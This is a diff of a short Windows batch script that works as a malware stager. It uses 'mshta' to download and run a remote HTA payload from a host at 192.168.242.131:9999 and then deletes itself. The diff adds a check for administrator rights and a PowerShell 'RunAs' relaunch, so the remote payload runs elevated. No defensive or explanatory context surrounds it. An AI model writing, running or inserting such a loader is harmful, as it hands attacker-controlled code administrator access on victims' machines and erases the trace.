@@ -1,4 +1,9 @@
 @echo off
+net session >nul 2>&1
+if %errorLevel% neq 0 (
+    powershell -Command "Start-Process cmd -ArgumentList '/c \"%~f0\"' -Verb RunAs"
+    exit
+)
 mshta http://192.168.242.131:9999/5UOY0
-timeout /t 1 > nul
 del "%~f0"
+exit
